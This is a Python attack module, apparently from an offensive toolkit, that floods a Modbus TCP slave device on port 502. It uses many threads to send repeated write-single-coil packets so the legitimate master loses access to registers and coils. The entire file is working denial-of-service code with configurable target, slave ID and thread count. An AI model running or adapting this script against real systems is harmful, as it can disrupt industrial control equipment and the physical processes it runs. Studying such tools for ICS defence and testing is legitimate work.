#!/usr/bin/python3

import sys
import threading
from queue import Queue
import socket

parallel = []
flag = 0

transaction_identifier = b"\x18\x03"	
protocol_identifier = b"\x00\x00"	
lenght_field = b"\x00\x06"				
mod_function = b"\x05"
value = b"\x00\x00"
nop = b"\x00" 

options = [
		['address','','Target address to be attacked.'],
		['port','502','Target port to be attacked. Default: 502'],
		['id','1','Slave\'s id, value between 1 and 256. Default: 1'],
		['threads','20','Number of threads. Default: 20']	
	]
	
def show_info():
	print("This module can be used to DOS the slave. During the attack, master can't read or write registers/coils from slave. This attack uses write coils function.")

def dos(address,port,payload):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.settimeout(1)
	s.connect((address,int(port)))
	while flag==0:
		try:
			s.send(payload)
			s.recv(100)
			
		except:
			pass
	s.close()
	return None


def thread_preparation(threads,address,port,payload):
	print("[+]Starting "+str(threads)+" threads!")
	print("Dos Attack is running...")
	print("      Use CTRL^C to stop :)    ")
	for i in range(0,int(threads)):
		t = threading.Thread(target=dos,args=(address,port,payload,))
		parallel.append(t)
		t.start()
def main():
	address= options[0][1]
	port= options[1][1]
	slave_id= options[2][1]
	threads= options[3][1]
	
	if port == '' or address == '' or slave_id=='' or threads=='' :
		print("[!] You should specify all parameters...")
		return None
	elif int(port) < 1 or int(port) > 65535 or not port.isnumeric():
		print("[!] You specified a wrong port...")
		return None
	elif int(slave_id) < 1 or int(slave_id) > 256 or not port.isnumeric():
		print("[!] You specified a wrong ID...")
		return None
	elif int(threads) < 1 or not port.isnumeric():
		print("[!] You specified a wrong number of threads...")
		return None
		
	slave_address = bytes([int(slave_id)])
	register = bytes([1])
	payload = transaction_identifier + protocol_identifier +lenght_field + slave_address + mod_function + nop + register + value
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		s.settimeout(1)
		s.connect((address,int(port)))
		s.close()
	except:
		print("[-] Host is offline or you specified a wrong port...")
		return None
	
	global flag
	try:
		flag=0;
		thread_preparation(threads,address,port,payload)
		for i in parallel:
			i.join()
	except KeyboardInterrupt :
		flag=1
		print("\n[+]Attack stopped!")
		
if __name__ == "__main__" :
	main()
